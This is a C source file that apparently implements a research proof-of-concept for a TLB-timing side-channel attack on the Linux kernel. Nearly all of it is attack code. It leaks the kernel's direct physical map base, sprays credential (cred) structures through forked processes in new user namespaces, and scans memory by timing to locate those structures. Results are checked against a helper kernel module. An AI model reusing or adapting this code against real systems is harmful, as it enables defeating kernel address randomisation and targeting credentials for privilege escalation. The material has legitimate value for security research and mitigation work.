#include "utils.h"
#include "cacheutils.h"
#include "tlb_flush.h"
#include "coarse_grain_leak.h"
#include "ulkm.h"
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <keyutils.h>
#include <pthread.h>

#define OBJ_PER_SLAB 42
#define CREDS_SPRAY (OBJ_PER_SLAB*50)

#define TRIES 100

char buffer[1<<12];
void get_times(size_t addr, size_t tries, size_t *time, size_t *time_n2, size_t *time_n4)
{
    size_t times[tries];
    size_t times_n2[tries];
    size_t times_n4[tries];
    for (size_t i = 0; i < tries; ++i) {
        flush_tlb_targeted_4k(addr);
        flush_tlb_targeted_4k(addr+2*(1<<12));
        flush_tlb_targeted_4k(addr+2*(1<<12));
        getuid();
        times[i] = onlyreload(addr);
        times_n2[i] = onlyreload(addr+2*(1<<12));
        times_n4[i] = onlyreload(addr+4*(1<<12));
    }
    qsort(times, tries, sizeof(size_t), comp);
    qsort(times_n2, tries, sizeof(size_t), comp);
    qsort(times_n4, tries, sizeof(size_t), comp);
    *time = times[tries/4];
    *time_n2 = times_n2[tries/4];
    *time_n4 = times_n4[tries/4];
}
int is_2mb(size_t addr, size_t tries)
{
    size_t time;
    size_t time_n2;
    size_t time_n4;
    get_times(addr, tries, &time, &time_n2, &time_n4);
    return (time < THRESHOLD && time_n2 < THRESHOLD && time_n4 < THRESHOLD);
}
int hit_flush(size_t addr, size_t tries)
{
    size_t time;
    size_t time_n2;
    size_t time_n4;
    get_times(addr, tries, &time, &time_n2, &time_n4);
    return (time < THRESHOLD && (time_n2 > THRESHOLD || time_n4 > THRESHOLD));
}

struct found_data {
    size_t found_addresses[32];
    size_t found_addresses_index;
    size_t cred;
};
struct found_data *data;
volatile size_t *state;
pthread_t tids[CREDS_SPRAY];
size_t creds[CREDS_SPRAY];

void alloc_cred(void)
{
    int ret = unshare(CLONE_NEWUSER);
    if (ret < 0) {
        perror("unshare(CLONE_NEWUSER)");
        exit(-1);
    }

    char path[0x100];
    snprintf(path, sizeof(path), "/proc/%d/ns/user", getpid());
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open(/proc/%d/ns/user)");
        exit(-1);
    }
}

void spray_cred(void)
{
    alloc_cred();
    sleep(-1);
}

int main(void)
{
    printf("[*] start\n");
    pin_to_core(0);
    lkm_init();
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);

    data = mmap(0, sizeof(struct found_data)*4, PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (data == MAP_FAILED) {
        perror("mmap(found_data)");
        exit(-1);
    }

    state = mmap(0, 4096, PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (state == MAP_FAILED) {
        perror("mmap(found_data)");
        exit(-1);
    }
    *state = 3;

    init_tlb_flush();
    get_total_memory();

    for (volatile size_t i = 0; i < (1ULL << 30); ++i);
    size_t dpm_base = dpm_leak(TRIES);
    printf("[*] dpm_base: %016zx\n", dpm_base);
    pin_to_core(15);

    printf("[*] spray creds\n");
    for (size_t i = 0; i < CREDS_SPRAY; ++i)
        if (fork() == 0)
            spray_cred();

    size_t index = 0;
    if (fork() == 0) {
        for (size_t i = 0; i < OBJ_PER_SLAB; ++i)
            if (fork() == 0)
                sleep(-1);

        index = (fork() == 0)*2;
        index += (fork() == 0);
        sched_yield();
        sched_yield();
        alloc_cred();
        pin_to_core(index);

        size_t cred;
        lkm_cred_leak((size_t)&cred);
        printf("[*] cred %zd %016zx\n", index, cred);
        data[index].cred = cred;
        if (index == 0) {
            size_t is_4kb = lkm_is_4kb(cred);
            printf("[*] %016zx is %s page\n", cred, is_4kb ? "4kB" : "2MB");
        }

        while (*state != index) sleep(1);
        printf("[*] redo %zd\n", index);

        size_t found_addresses[32] = {0};
        size_t found_addresses_index = 0;

        if (index == 3) {

            for (size_t addr = dpm_base; addr < dpm_base+mem_total_rounded; addr += (1<<21)) {
                if ((addr % (1 << 30)) == 0)
                    printf("[*] addr %016zx\n", addr);

                if (is_2mb(addr, 40))
                    continue;
                for (size_t i = 0; i < (1ULL << 21); i += (1ULL << 12)) {
                    size_t cur_addr = addr + i;
                    size_t found_0 = hit_flush(cur_addr, TRIES);
                    if (!found_0)
                        continue;
                    found_addresses[found_addresses_index++] = cur_addr;
                    printf("[+] %zd found addr %016zx\n", index, cur_addr);
                }
            }
        } else {
            for (size_t i = 0; i < data[index+1].found_addresses_index; ++i) {
                for (size_t j = 0; j < 2; ++j) {
                    size_t addr = (data[index+1].found_addresses[i] & ~((1<<13)-1)) + j*(1<<12);
                    printf("[*] addr %016zx\n", addr);
                    size_t found_0 = hit_flush(addr, TRIES);
                    if (!found_0)
                        continue;
                    found_addresses[found_addresses_index++] = addr;
                    printf("[+] %zd found addr %016zx\n", index, addr);
                }
            }
        }

        memcpy(data[index].found_addresses, found_addresses, sizeof(found_addresses));
        data[index].found_addresses_index = found_addresses_index;

        *state -= 1;
        exit(0);
    } else {
        wait(0);
    }

    size_t found_addresses[32] = {0};
    size_t found_addresses_index = 0;
    if (data[0].found_addresses_index == 2 &&
        (data[0].found_addresses[0] & ~((1<<13)-1)) == (data[0].found_addresses[1] & ~((1<<13)-1))) {
        found_addresses[0] = data[0].found_addresses[0] & ~((1<<13)-1);
        found_addresses_index = 1;
    } else {
        memcpy(found_addresses, data[0].found_addresses, sizeof(found_addresses));
        found_addresses_index = data[0].found_addresses_index;
    }

    if (found_addresses_index == 0)
        printf("[*] non found -> retry\n");
    else if (found_addresses_index != 1)
        printf("[*] multiple addresses -> retry\n");
    else if ((found_addresses[0] & ~((1<<13)-1)) == (data[0].cred & ~((1<<13)-1)))
        printf("[+] success\n");
    else
        printf("[!] fail\n");
    signal(SIGQUIT, SIG_IGN);
    kill(0, SIGQUIT);
}